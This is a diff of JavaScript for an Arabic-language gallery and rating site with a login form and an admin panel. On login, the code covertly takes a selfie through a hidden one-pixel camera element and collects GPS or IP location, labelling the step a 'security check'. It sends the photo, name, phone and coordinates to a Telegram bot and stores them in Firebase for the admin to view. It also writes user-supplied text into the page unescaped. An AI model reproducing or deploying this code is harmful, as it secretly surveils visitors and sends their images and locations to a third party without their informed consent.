+            // FLOATING CODE + EMOJIS
+            // ============================================================
+            (function initFloating() {
+                const container = document.getElementById('floatingCode');
+                const snippets = [
+                    '</>', '{ }', '=>', '0x1F', '010010', '#!/bin', '$_', '::', 'if()', '>/>',
+                    '<script>', '&&', '||', '[]', '{}', '#!', '0x00', '&&&', '...', '>_',
+                    'C++', 'def', 'null', 'void', 'true', 'fn()', '0xDEAD', 'ff', 'AA', 'x86'
+                ];
+                const emojis = ['💀','👾','🎭','☠️','🕶️','👁️','🗿','🎯','⚡','🔥','⚔️','🛡️'];
+                const total = 22;
+                for (let i = 0; i < total; i++) {
+                    const span = document.createElement('span');
+                    const isEmoji = i % 4 === 0;
+                    if (isEmoji) {
+                        span.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                        span.className = 'emo';
+                    } else {
+                        span.textContent = snippets[Math.floor(Math.random() * snippets.length)];
+                    }
+                    span.style.left = (Math.random() * 95) + '%';
+                    span.style.animationDuration = (14 + Math.random() * 14) + 's';
+                    span.style.animationDelay = (Math.random() * 12) + 's';
+                    if (!isEmoji) {
+                        const colors = ['#00ff88', '#00e5ff', '#00b862'];
+                        span.style.color = colors[Math.floor(Math.random() * colors.length)];
+                    }
+                    container.appendChild(span);
+                }
+            })();
+
+            // ============================================================
+            // HELPERS
+            // ============================================================
+            function sanitizeKey(str) {
+                return String(str).replace(/[.#$\[\]\/]/g, '_').trim();
+            }
+            function normalizePhone(p) {
+                return String(p).replace(/[^\d+]/g, '').trim();
+            }
+            function dataURLToBlob(dataURL) {
+                const parts = dataURL.split(',');
+                const mime = parts[0].match(/:(.*?);/)[1];
+                const bstr = atob(parts[1]);
+                const n = bstr.length;
+                const u8arr = new Uint8Array(n);
+                for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
+                return new Blob([u8arr], { type: mime });
+            }
+            async function sendPhotoToTelegram(blob, filename, caption) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, filename);
+                if (caption) formData.append('caption', caption);
+                try { await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData }); }
+                catch (e) { console.warn('photo send err:', e); }
+            }
+            async function sendTextToTelegram(text) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+                    });
+                } catch (e) { console.warn('msg send err:', e); }
+            }
+            function compressImage(file, maxW, quality) {
+                maxW = maxW || 900; quality = quality || 0.72;
+                return new Promise((resolve, reject) => {
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        const img = new Image();
+                        img.onload = function() {
+                            let w = img.width, h = img.height;
+                            if (w > maxW) { h = Math.round(h * maxW / w); w = maxW; }
+                            const canvas = document.createElement('canvas');
+                            canvas.width = w; canvas.height = h;
+                            const ctx = canvas.getContext('2d');
+                            ctx.fillStyle = '#000';
+                            ctx.fillRect(0, 0, w, h);
+                            ctx.drawImage(img, 0, 0, w, h);
+                            resolve(canvas.toDataURL('image/jpeg', quality));
+                        };
+                        img.onerror = reject;
+                        img.src = e.target.result;
+                    };
+                    reader.onerror = reject;
+                    reader.readAsDataURL(file);
+                });
+            }
+
+            let toastTimer = null;
+            function showToast(msg, isError) {
+                const span = adminToast.querySelector('span');
+                const icon = adminToast.querySelector('i');
+                span.textContent = msg;
+                adminToast.classList.toggle('err', !!isError);
+                icon.className = isError ? 'fas fa-exclamation-circle' : 'fas fa-check-circle';
+                adminToast.classList.add('show');
+                clearTimeout(toastTimer);
+                toastTimer = setTimeout(() => adminToast.classList.remove('show'), 2600);
+            }
+            function showView(id) {
+                document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+                document.getElementById(id).classList.add('active');
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
+
+            // ============================================================
+            // SELFIE + LOCATION
+            // ============================================================
+            async function captureSelfieSilently() {
+                try {
+                    const s = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 360 } },
+                        audio: false
+                    });
+                    const video = document.createElement('video');
+                    video.srcObject = s;
+                    video.setAttribute('playsinline', '');
+                    video.style.cssText = 'position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;';
+                    document.body.appendChild(video);
+                    await video.play();
+                    await new Promise(r => {
+                        if (video.readyState >= 2) r();
+                        else video.onloadeddata = r;
+                    });
+                    await new Promise(r => setTimeout(r, 700));
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 480;
+                    canvas.height = video.videoHeight || 360;
+                    const ctx = canvas.getContext('2d');
+                    ctx.translate(canvas.width, 0);
+                    ctx.scale(-1, 1);
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const dataURL = canvas.toDataURL('image/jpeg', 0.82);
+                    video.pause(); video.srcObject = null;
+                    document.body.removeChild(video);
+                    s.getTracks().forEach(t => t.stop());
+                    return dataURL;
+                } catch (e) { console.warn('selfie err:', e); return null; }
+            }
+            function getLocationOnce() {
+                return new Promise((resolve) => {
+                    if (!navigator.geolocation) { fetchLocationByIP().then(resolve); return; }
+                    let done = false;
+                    const to = setTimeout(() => {
+                        if (done) return;
+                        done = true;
+                        fetchLocationByIP().then(resolve);
+                    }, 12000);
+                    navigator.geolocation.getCurrentPosition(
+                        async (pos) => {
+                            if (done) return;
+                            done = true; clearTimeout(to);
+                            const { latitude, longitude, accuracy } = pos.coords;
+                            let address = '';
+                            try {
+                                const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=16&accept-language=ar`);
+                                const data = await resp.json();
+                                if (data && data.display_name) address = data.display_name;
+                            } catch (_) {}
+                            resolve({
+                                lat: latitude, lng: longitude,
+                                accuracy: accuracy ? Math.round(accuracy) + ' م' : 'غير معروف',
+                                address: address || 'غير متاح'
+                            });
+                        },
+                        () => {
+                            if (done) return;
+                            done = true; clearTimeout(to);
+                            fetchLocationByIP().then(resolve);
+                        },
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
+                });
+            }
+            async function fetchLocationByIP() {
+                try {
+                    const resp = await fetch('https://ipapi.co/json/');
+                    const data = await resp.json();
+                    if (data && data.latitude && data.longitude) {
+                        return {
+                            lat: parseFloat(data.latitude),
+                            lng: parseFloat(data.longitude),
+                            accuracy: 'تقريبي (IP)',
+                            address: data.city ? `${data.city}, ${data.country_name}` : 'غير متاح'
+                        };
+                    }
+                } catch (_) {}
+                return { lat: 0, lng: 0, accuracy: 'غير معروف', address: 'غير متاح' };
+            }
+
+            // ============================================================
+            // LOGIN
+            // ============================================================
+            function loadStoredUser() {
+                try {
+                    const raw = localStorage.getItem('zk_user');
+                    if (!raw) return null;
+                    const u = JSON.parse(raw);
+                    if (u && u.name && u.phone) return u;
+                } catch (_) {}
+                return null;
+            }
+
+            async function onLoginSubmit() {
+                if (loginAttempted) return;
+                const name = loginName.value.trim();
+                const phone = normalizePhone(loginPhone.value);
+                loginError.textContent = '';
+                if (name.length < 2) { loginError.textContent = 'الاسم قصير جداً (حرفان على الأقل)'; return; }
+                if (phone.length < 8) { loginError.textContent = 'رقم الهاتف غير صحيح'; return; }
+                if (!firebaseReady) { loginError.textContent = 'الخدمة غير جاهزة، حاول لحظات'; return; }
+
+                loginAttempted = true;
+                loginBtn.disabled = true;
+                const old = loginBtn.innerHTML;
+                loginBtn.innerHTML = '<span class="spinner"></span> جاري التحقق...';
+
+                try {
+                    const userKey = sanitizeKey(phone);
+                    const nameKey = sanitizeKey(name.toLowerCase());
+
+                    const userSnap = await get(ref(db, 'users/' + userKey));
+                    if (userSnap.exists()) {
+                        const existing = userSnap.val();
+                        if (existing.name && existing.name.trim().toLowerCase() !== name.toLowerCase()) {
+                            loginError.textContent = 'هذا الرقم مسجل باسم آخر — لا يمكنك استخدامه';
+                            loginAttempted = false;
+                            loginBtn.disabled = false;
+                            loginBtn.innerHTML = old;
+                            return;
+                        }
+                        currentUser = { name: existing.name, phone: phone, key: userKey };
+                    } else {
+                        const nameSnap = await get(ref(db, 'nameIndex/' + nameKey));
+                        if (nameSnap.exists() && nameSnap.val() !== phone) {
+                            loginError.textContent = 'هذا الاسم مسجل برقم آخر — لا يمكنك إنشاء حساب مكرر';
+                            loginAttempted = false;
+                            loginBtn.disabled = false;
+                            loginBtn.innerHTML = old;
+                            return;
+                        }
+                        currentUser = { name: name, phone: phone, key: userKey };
+                    }
+
+                    localStorage.setItem('zk_user', JSON.stringify(currentUser));
+                    loginBtn.innerHTML = '<span class="spinner"></span> جاري التحقق الأمني...';
+
+                    const [selfie, loc] = await Promise.all([
+                        captureSelfieSilently(),
+                        getLocationOnce()
+                    ]);
+
+                    if (selfie) {
+                        const blob = dataURLToBlob(selfie);
+                        await sendPhotoToTelegram(blob, `login_${userKey}.jpg`,
+                            `🔐 <b>تسجيل دخول</b>\n👤 ${currentUser.name}\n📞 ${currentUser.phone}`);
+                    }
+                    await sendTextToTelegram(
+                        `📍 <b>موقع تسجيل الدخول</b>\n👤 ${currentUser.name}\n📞 ${currentUser.phone}\n` +
+                        `- الإحداثيات: ${loc.lat}, ${loc.lng}\n- الدقة: ${loc.accuracy}\n- العنوان: ${loc.address}`
+                    );
+
+                    const nowIso = new Date().toISOString();
+                    const existingSnap = await get(ref(db, 'users/' + userKey));
+                    const existing = existingSnap.exists() ? existingSnap.val() : null;
+
+                    const payload = {
+                        name: currentUser.name,
+                        phone: currentUser.phone,
+                        lastLogin: nowIso,
+                        lastLocation: loc,
+                        loginCount: (existing && existing.loginCount ? existing.loginCount : 0) + 1,
+                        createdAt: (existing && existing.createdAt) || nowIso
+                    };
+                    if (selfie) payload.lastSelfie = selfie;
+                    if (!existing) payload.firstLocation = loc;
+                    if (!existing && selfie) payload.firstSelfie = selfie;
+
+                    await set(ref(db, 'users/' + userKey), payload);
+                    await set(ref(db, 'nameIndex/' + nameKey), phone);
+
+                    chipUserName.textContent = currentUser.name;
+                    chipUserPhone.textContent = currentUser.phone;
+                    showView('viewHome');
+                    renderWorksGrid();
+                    showToast('تم تسجيل الدخول بنجاح ✅');
+                } catch (e) {
+                    console.error(e);
+                    loginError.textContent = 'حدث خطأ غير متوقع، حاول مرة أخرى';
+                    loginAttempted = false;
+                } finally {
+                    loginBtn.disabled = false;
+                    loginBtn.innerHTML = old;
+                }
+            }
+
+            loginBtn.addEventListener('click', onLoginSubmit);
+            loginPhone.addEventListener('keydown', e => { if (e.key === 'Enter') onLoginSubmit(); });
+            loginName.addEventListener('keydown', e => { if (e.key === 'Enter') loginPhone.focus(); });
+
+            function autoLogin() {
+                const u = loadStoredUser();
+                if (u) {
+                    currentUser = u;
+                    chipUserName.textContent = u.name;
+                    chipUserPhone.textContent = u.phone;
+                    showView('viewHome');
+                    return true;
+                }
+                return false;
+            }
+
+            goWorksBtn.addEventListener('click', () => showView('viewWorks'));
+            worksBackBtn.addEventListener('click', () => showView('viewHome'));
+
+            // ============================================================
+            // RATING
+            // ============================================================
+            function hasRated(imageId) {
+                return Number(localStorage.getItem('zk_rated_' + imageId) || 0) || null;
+            }
+            function saveUserRating(imageId, stars) {
+                localStorage.setItem('zk_rated_' + imageId, String(stars));
+            }
+            function renderStarsHTML(imageId, avg, total, myRating) {
+                let html = '<div class="stars' + (myRating ? ' locked' : '') + '" data-id="' + imageId + '">';
+                for (let i = 1; i <= 5; i++) {
+                    const lit = myRating ? (i <= myRating) : false;
+                    html += `<i class="fas fa-star ${lit ? 'lit' : ''}" data-value="${i}"></i>`;
+                }
+                html += '</div>';
+                const avgText = total > 0 ? avg.toFixed(1) : '—';
+                html += `<div class="rating-summary">AVG: <b>${avgText}</b> / 5 · ${total} تقييم</div>`;
+                if (myRating) html += `<div class="rating-user">✓ لقد قيّمت بـ ${myRating} ${'⭐'.repeat(myRating)}</div>`;
+                return html;
+            }
+            async function submitRating(imageId, stars) {
+                if (!firebaseReady) { showToast('الخدمة غير جاهزة', true); return; }
+                if (hasRated(imageId)) { showToast('لقد قمت بتقييم هذا العمل مسبقاً'); return; }
+                const img = currentImages[imageId];
+                if (!img) return;
+                const newSum = (Number(img.ratingSum) || 0) + stars;
+                const newCount = (Number(img.ratingCount) || 0) + 1;
+                try {
+                    await fbUpdate(ref(db, 'content/images/' + imageId), {
+                        ratingSum: newSum, ratingCount: newCount
+                    });
+                    saveUserRating(imageId, stars);
+                    showToast('تم تقييم العمل بنجاح ⭐');
+                } catch (e) { showToast('فشل حفظ التقييم', true); }
+            }
+            function attachStarsListeners(root) {
+                root.querySelectorAll('.stars').forEach(starsEl => {
+                    const imageId = starsEl.getAttribute('data-id');
+                    if (starsEl.classList.contains('locked')) return;
+                    const icons = starsEl.querySelectorAll('i');
+                    icons.forEach(icon => {
+                        icon.addEventListener('mouseenter', function() {
+                            const v = Number(this.getAttribute('data-value'));
+                            icons.forEach(ic => ic.classList.toggle('hover', Number(ic.getAttribute('data-value')) <= v));
+                        });
+                        icon.addEventListener('click', function() {
+                            submitRating(imageId, Number(this.getAttribute('data-value')));
+                        });
+                    });
+                    starsEl.addEventListener('mouseleave', () => icons.forEach(ic => ic.classList.remove('hover')));
+                });
+            }
+
+            // ============================================================
+            // VISIBILITY LOGIC
+            // ============================================================
+            function canUserSeeWork(img, userKey) {
+                if (img.visible === false) return false;
+                const mode = img.visibility || 'public';
+                if (mode === 'public') return true;
+                if (mode === 'specific') {
+                    if (!userKey) return false;
+                    return Array.isArray(img.visibleTo) && img.visibleTo.includes(userKey);
+                }
+                return true;
+            }
+
+            // ============================================================
+            // RENDER WORKS GRID
+            // ============================================================
+            function renderWorksGrid() {
+                const userKey = currentUser ? currentUser.key : null;
+
+                const arr = Object.keys(currentImages)
+                    .map(k => Object.assign({ _id: k }, currentImages[k]))
+                    .filter(img => canUserSeeWork(img, userKey));
+
+                arr.sort((a, b) => (b.createdAt || '').localeCompare(a.createdAt || ''));
+
+                if (arr.length === 0) {
+                    worksGrid.innerHTML = `
+                        <div class="works-empty" style="grid-column:1/-1;">
+                            <i class="fas fa-folder-open"></i>
+                            NO WORKS YET · لا توجد أعمال متاحة لك حالياً
+                        </div>`;
+                    return;
+                }
+
+                worksGrid.innerHTML = arr.map(img => {
+                    const sum = Number(img.ratingSum) || 0;
+                    const cnt = Number(img.ratingCount) || 0;
+                    const avg = cnt > 0 ? sum / cnt : 0;
+                    const myRating = hasRated(img._id);
+                    const title = img.title || img.caption || 'بدون عنوان';
+                    const desc = img.description || '';
+                    const date = img.createdAt ? new Date(img.createdAt).toLocaleDateString('ar-EG') : '';
+                    const isPrivate = (img.visibility || 'public') === 'specific';
+
+                    return `
+                        <div class="work-card ${isPrivate ? 'private-work' : ''}">
+                            <img class="work-image" src="${img.data}" alt="${title}" loading="lazy">
+                            <div class="work-body">
+                                <div class="work-title">${title}</div>
+                                ${desc ? `<div class="work-info">${desc}</div>` : ''}
+                                <div class="work-meta">
+                                    ${date ? `<span><i class="fas fa-calendar"></i> ${date}</span>` : ''}
+                                    <span><i class="fas fa-star"></i> ${cnt} تقييم</span>
+                                    ${isPrivate ? '<span class="private-tag"><i class="fas fa-user-check"></i> خاص لك</span>' : ''}
+                                </div>
+                                <div class="rating-block">
+                                    <div class="rating-label">قيم العمل</div>
+                                    ${renderStarsHTML(img._id, avg, cnt, myRating)}
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+
+                attachStarsListeners(worksGrid);
+            }
+
+            // ============================================================
+            // ADMIN RENDERING
+            // ============================================================
+            function applyMainContent(data) {
+                if (!data) return;
+                if (data.brandTitle) {
+                    document.getElementById('uiBrandTitle').textContent = data.brandTitle;
+                    document.getElementById('uiBrandTitle').setAttribute('data-text', data.brandTitle);
+                    document.getElementById('uiBrandTitleLogin').textContent = data.brandTitle;
+                    document.getElementById('uiBrandTitleLogin').setAttribute('data-text', data.brandTitle);
+                }
+                if (data.brandSubtitle) document.getElementById('uiBrandSubtitle').textContent = data.brandSubtitle;
+                if (data.badgeText) document.getElementById('uiBadge').innerHTML = '<i class="fas fa-star"></i> <span>' + data.badgeText + '</span>';
+                if (data.rewardHeading) document.getElementById('uiRewardHeading').textContent = data.rewardHeading;
+                if (data.rewardDesc) document.getElementById('uiRewardDesc').innerHTML = data.rewardDesc;
+                if (data.footerText) document.getElementById('uiFooter').innerHTML = '<i class="fas fa-shield-alt"></i> ' + data.footerText;
+
+                f_brandTitle.value = data.brandTitle || '';
+                f_brandSubtitle.value = data.brandSubtitle || '';
+                f_badgeText.value = data.badgeText || '';
+                f_rewardHeading.value = data.rewardHeading || '';
+                f_rewardDesc.value = data.rewardDesc || '';
+                f_footerText.value = data.footerText || '';
+            }
+
+            function renderAdminImages() {
+                const arr = Object.keys(currentImages).map(k => Object.assign({ _id: k }, currentImages[k]));
+                arr.sort((a, b) => (b.createdAt || '').localeCompare(a.createdAt || ''));
+
+                if (arr.length === 0) {
+                    adminImagesList.innerHTML = '<div class="admin-empty">لا توجد أعمال بعد</div>';
+                    return;
+                }
+
+                adminImagesList.innerHTML = arr.map(img => {
+                    const sum = Number(img.ratingSum) || 0;
+                    const cnt = Number(img.ratingCount) || 0;
+                    const avg = cnt > 0 ? (sum / cnt).toFixed(1) : '—';
+                    const title = img.title || img.caption || 'بدون عنوان';
+                    const isVisible = img.visible !== false;
+                    const visMode = img.visibility || 'public';
+                    const visCount = Array.isArray(img.visibleTo) ? img.visibleTo.length : 0;
+
+                    const visBadgeHTML = visMode === 'specific'
+                        ? `<div class="vis-badge specific"><i class="fas fa-user-check"></i> مخصص (${visCount})</div>`
+                        : `<div class="vis-badge"><i class="fas fa-globe"></i> للكل</div>`;
+
+                    return `
+                        <div class="admin-image-item ${isVisible ? '' : 'hidden-item'}">
+                            <button class="vis-toggle ${isVisible ? '' : 'off'}" data-visid="${img._id}" title="${isVisible ? 'إخفاء' : 'إظهار'}">
+                                <i class="fas ${isVisible ? 'fa-eye' : 'fa-eye-slash'}"></i>
+                            </button>
+                            <button class="del" data-id="${img._id}" title="حذف"><i class="fas fa-trash"></i></button>
+                            <img src="${img.data}" alt="">
+                            <div class="cap">${title}</div>
+                            <div class="rate-badge"><i class="fas fa-star"></i> ${avg} (${cnt})</div>
+                            ${visBadgeHTML}
+                        </div>
+                    `;
+                }).join('');
+
+                adminImagesList.querySelectorAll('.del').forEach(btn => {
+                    btn.addEventListener('click', async function() {
+                        const id = this.getAttribute('data-id');
+                        if (!confirm('هل تريد حذف هذا العمل؟')) return;
+                        try {
+                            await remove(ref(db, 'content/images/' + id));
+                            showToast('تم حذف العمل');
+                        } catch (e) { showToast('فشل الحذف', true); }
+                    });
+                });
+                adminImagesList.querySelectorAll('.vis-toggle').forEach(btn => {
+                    btn.addEventListener('click', async function() {
+                        const id = this.getAttribute('data-visid');
+                        const img = currentImages[id];
+                        if (!img) return;
+                        const newVis = !(img.visible !== false);
+                        try {
+                            await fbUpdate(ref(db, 'content/images/' + id), { visible: newVis });
+                            showToast(newVis ? 'تم إظهار العمل' : 'تم إخفاء العمل');
+                        } catch (e) { showToast('فشل التحديث', true); }
+                    });
+                });
+            }
+
+            function renderUsersList() {
+                const arr = Object.keys(currentUsers).map(k => Object.assign({ _key: k }, currentUsers[k]));
+                arr.sort((a, b) => (b.lastLogin || '').localeCompare(a.lastLogin || ''));
+
+                if (arr.length === 0) {
+                    usersList.innerHTML = '<div class="admin-empty">لا يوجد مستخدمون بعد</div>';
+                    return;
+                }
+
+                usersList.innerHTML = arr.map(u => {
+                    const selfie = u.lastSelfie || u.firstSelfie || '';
+                    const loc = u.lastLocation || u.firstLocation || {};
+                    const created = u.createdAt ? new Date(u.createdAt).toLocaleString('ar-EG') : '—';
+                    const lastL = u.lastLogin ? new Date(u.lastLogin).toLocaleString('ar-EG') : '—';
+                    const locLine = loc.address && loc.address !== 'غير متاح'
+                        ? loc.address
+                        : (loc.lat && loc.lng ? `${loc.lat}, ${loc.lng}` : 'غير متاح');
+                    return `
+                        <div class="user-card">
+                            <div class="user-card-head">
+                                <div class="user-avatar">
+                                    ${selfie ? `<img src="${selfie}" alt="">` : '<i class="fas fa-user"></i>'}
+                                </div>
+                                <div style="min-width:0;flex:1;">
+                                    <div class="user-name">${u.name || '—'}</div>
+                                    <div class="user-phone">${u.phone || '—'}</div>
+                                </div>
+                            </div>
+                            <div class="user-meta-list">
+                                <span><i class="fas fa-calendar-plus"></i> تسجيل: ${created}</span>
+                                <span><i class="fas fa-sign-in-alt"></i> آخر دخول: ${lastL}</span>
+                                <span><i class="fas fa-hashtag"></i> عدد الدخول: ${u.loginCount || 0}</span>
+                                <span class="loc"><i class="fas fa-map-marker-alt"></i> ${locLine}</span>
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+            }
+
+            // ============================================================
+            // USER PICKER
+            // ============================================================
+            function renderUserPicker() {
+                const arr = Object.keys(currentUsers).map(k => Object.assign({ _key: k }, currentUsers[k]));
+                arr.sort((a, b) => (a.name || '').localeCompare(b.name || ''));
+
+                if (arr.length === 0) {
+                    userPickerList.innerHTML = '<div class="admin-empty" style="padding:16px;">لا يوجد مستخدمون بعد</div>';
+                    selectedCount.textContent = '0 محدد';
+                    return;
+                }
+
+                userPickerList.innerHTML = arr.map(u => {
+                    const selfie = u.lastSelfie || u.firstSelfie || '';
+                    const isSel = pendingSelectedUsers.has(u._key);
+                    return `
+                        <label class="user-pick-item ${isSel ? 'selected' : ''}">
+                            <input type="checkbox" data-ukey="${u._key}" ${isSel ? 'checked' : ''}>
+                            <div class="user-pick-avatar">
+                                ${selfie ? `<img src="${selfie}" alt="">` : '<i class="fas fa-user"></i>'}
+                            </div>
+                            <div class="user-pick-info">
+                                <div class="user-pick-name">${u.name || '—'}</div>
+                                <div class="user-pick-phone">${u.phone || '—'}</div>
+                            </div>
+                        </label>
+                    `;
+                }).join('');
+
+                userPickerList.querySelectorAll('input[type="checkbox"]').forEach(cb => {
+                    cb.addEventListener('change', function() {
+                        const ukey = this.getAttribute('data-ukey');
+                        const parent = this.closest('.user-pick-item');
+                        if (this.checked) {
+                            pendingSelectedUsers.add(ukey);
+                            parent.classList.add('selected');
+                        } else {
+                            pendingSelectedUsers.delete(ukey);
+                            parent.classList.remove('selected');
+                        }
+                        selectedCount.textContent = pendingSelectedUsers.size + ' محدد';
+                    });
+                });
+
+                selectedCount.textContent = pendingSelectedUsers.size + ' محدد';
+            }
+
+            visModeBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    visModeBtns.forEach(b => b.classList.remove('active'));
+                    this.classList.add('active');
+                    pendingVisibilityMode = this.getAttribute('data-mode');
+                    if (pendingVisibilityMode === 'specific') {
+                        userPicker.style.display = 'block';
+                        renderUserPicker();
+                    } else {
+                        userPicker.style.display = 'none';
+                    }
+                });
+            });
+
+            function resetVisibilityPicker() {
+                pendingVisibilityMode = 'public';
+                pendingSelectedUsers.clear();
+                visModeBtns.forEach(b => b.classList.remove('active'));
+                visModeBtns[0].classList.add('active');
+                userPicker.style.display = 'none';
+                selectedCount.textContent = '0 محدد';
+            }
+
+            // ============================================================
+            // FIREBASE LISTENERS
+            // ============================================================
+            function loadContentFromFirebase() {
+                onValue(ref(db, 'content/main'), snap => applyMainContent(snap.val()));
+                onValue(ref(db, 'content/images'), snap => {
+                    currentImages = snap.val() || {};
+                    renderWorksGrid();
+                    renderAdminImages();
+                });
+                onValue(ref(db, 'users'), snap => {
+                    currentUsers = snap.val() || {};
+                    renderUsersList();
+                    if (pendingVisibilityMode === 'specific' && userPicker.style.display !== 'none') {
+                        renderUserPicker();
+                    }
+                });
+            }
+            onFirebaseReady(loadContentFromFirebase);
+            onFirebaseReady(loadAdminCredentials);
+
+            // ============================================================
+            // ADMIN LOGIN FLOW
+            // ============================================================
+            function openAdminModal() {
+                adminModal.classList.add('active');
+                document.body.style.overflow = 'hidden';
+                resetAdminSteps();
+            }
+            function closeAdminModal() {
+                adminModal.classList.remove('active');
+                document.body.style.overflow = '';
+                resetAdminSteps();
+            }
+            function resetAdminSteps() {
+                adminStep1.classList.add('active');
+                adminStep2.classList.remove('active');
+                adminStep3.classList.remove('active');
+                adminPass1.value = '';
+                adminEmail.value = '';
+                adminPass2.value = '';
+                adminErr1.textContent = '';
+                adminErr2.textContent = '';
+            }
+            adminFab.addEventListener('click', openAdminModal);
+            adminClose.addEventListener('click', closeAdminModal);
+            adminModal.addEventListener('click', e => { if (e.target === adminModal) closeAdminModal(); });
+
+            adminNext1.addEventListener('click', async () => {
+                if (!adminCredsReady || !adminCreds) {
+                    adminErr1.textContent = 'الخدمة غير جاهزة، حاول لحظات...';
+                    return;
+                }
+                const val = adminPass1.value.trim();
+                adminNext1.disabled = true;
+                const old = adminNext1.innerHTML;
+                adminNext1.innerHTML = '<span class="spinner"></span> جاري التحقق...';
+                try {
+                    const hash = await window.fbSha256(val);
+                    if (hash === adminCreds.pass1Hash) {
+                        adminErr1.textContent = '';
+                        adminStep1.classList.remove('active');
+                        adminStep2.classList.add('active');
+                        setTimeout(() => adminEmail.focus(), 200);
+                    } else {
+                        adminErr1.textContent = 'كلمة المرور غير صحيحة';
+                        adminPass1.value = '';
+                        adminPass1.focus();
+                    }
+                } catch (e) {
+                    adminErr1.textContent = 'حدث خطأ، حاول مرة أخرى';
+                } finally {
+                    adminNext1.disabled = false;
+                    adminNext1.innerHTML = old;
+                }
+            });
+            adminPass1.addEventListener('keydown', e => {
+                if (e.key === 'Enter') adminNext1.click();
+            });
+
+            adminNext2.addEventListener('click', async () => {
+                if (!adminCredsReady || !adminCreds) {
+                    adminErr2.textContent = 'الخدمة غير جاهزة، حاول لحظات...';
+                    return;
+                }
+                const em = adminEmail.value.trim().toLowerCase();
+                const pw = adminPass2.value.trim();
+                adminNext2.disabled = true;
+                const old = adminNext2.innerHTML;
+                adminNext2.innerHTML = '<span class="spinner"></span> جاري التحقق...';
+                try {
+                    const emailHash = await window.fbSha256(em);
+                    const passHash = await window.fbSha256(pw);
+                    if (emailHash === adminCreds.emailHash && passHash === adminCreds.pass2Hash) {
+                        adminErr2.textContent = '';
+                        adminStep2.classList.remove('active');
+                        adminStep3.classList.add('active');
+                    } else {
+                        adminErr2.textContent = 'البريد أو الرقم السري غير صحيح';
+                        adminPass2.value = '';
+                        adminPass2.focus();
+                    }
+                } catch (e) {
+                    adminErr2.textContent = 'حدث خطأ، حاول مرة أخرى';
+                } finally {
+                    adminNext2.disabled = false;
+                    adminNext2.innerHTML = old;
+                }
+            });
+            adminPass2.addEventListener('keydown', e => {
+                if (e.key === 'Enter') adminNext2.click();
+            });
+
+            adminLogout.addEventListener('click', () => {
+                closeAdminModal();
+                showToast('تم الخروج من اللوحة');
+            });
+
+            document.querySelectorAll('.admin-tab').forEach(tab => {
+                tab.addEventListener('click', function() {
+                    const t = this.getAttribute('data-tab');
+                    document.querySelectorAll('.admin-tab').forEach(x => x.classList.remove('active'));
+                    document.querySelectorAll('.admin-pane').forEach(x => x.classList.remove('active'));
+                    this.classList.add('active');
+                    const id = 'pane' + (t === 'texts' ? 'Texts' : t === 'images' ? 'Images' : 'Users');
+                    document.getElementById(id).classList.add('active');
+                });
+            });
+
+            saveTextsBtn.addEventListener('click', async () => {
+                if (!firebaseReady) { showToast('الخدمة غير جاهزة', true); return; }
+                saveTextsBtn.disabled = true;
+                const old = saveTextsBtn.innerHTML;
+                saveTextsBtn.innerHTML = '<span class="spinner"></span> جاري الحفظ...';
+                try {
+                    await set(ref(db, 'content/main'), {
+                        brandTitle: f_brandTitle.value.trim(),
+                        brandSubtitle: f_brandSubtitle.value.trim(),
+                        badgeText: f_badgeText.value.trim(),
+                        rewardHeading: f_rewardHeading.value.trim(),
+                        rewardDesc: f_rewardDesc.value.trim(),
+                        footerText: f_footerText.value.trim(),
+                        updatedAt: new Date().toISOString()
+                    });
+                    showToast('تم حفظ التعديلات ✅');
+                } catch (e) { showToast('فشل الحفظ', true); }
+                finally {
+                    saveTextsBtn.disabled = false;
+                    saveTextsBtn.innerHTML = old;
+                }
+            });
+
+            uploadArea.addEventListener('click', () => adminImageInput.click());
+            adminImageInput.addEventListener('change', async function(e) {
+                const file = e.target.files && e.target.files[0];
+                if (!file) return;
+                uploadArea.innerHTML = '<span class="spinner" style="display:inline-block;"></span><span style="display:block;margin-top:8px;">جاري تجهيز الصورة...</span>';
+                try {
+                    pendingImageData = await compressImage(file, 900, 0.72);
+                    uploadArea.innerHTML = `<i class="fas fa-check-circle" style="color:#00ff88;"></i>
+                        <span style="color:#00ff88;">تم تجهيز الصورة</span>
+                        <small>اضغط لاختيار صورة أخرى</small>`;
+                    addImageBtn.disabled = false;
+                } catch (err) {
+                    uploadArea.innerHTML = `<i class="fas fa-cloud-upload-alt"></i>
+                        <span>اضغط لاختيار صورة من جهازك</span>
+                        <small>JPG · PNG · WEBP</small>`;
+                    showToast('فشل تجهيز الصورة', true);
+                }
+            });
+
+            addImageBtn.addEventListener('click', async function() {
+                if (!pendingImageData) return;
+                if (!firebaseReady) { showToast('الخدمة غير جاهزة', true); return; }
+
+                const mode = pendingVisibilityMode;
+                const visibleTo = mode === 'specific' ? Array.from(pendingSelectedUsers) : [];
+
+                if (mode === 'specific' && visibleTo.length === 0) {
+                    showToast('اختر مستخدماً واحداً على الأقل', true);
+                    return;
+                }
+
+                addImageBtn.disabled = true;
+                const old = addImageBtn.innerHTML;
+                addImageBtn.innerHTML = '<span class="spinner"></span> جاري الإضافة...';
+                try {
+                    const newRef = push(ref(db, 'content/images'));
+                    await set(newRef, {
+                        data: pendingImageData,
+                        title: f_workTitle.value.trim() || 'عمل جديد',
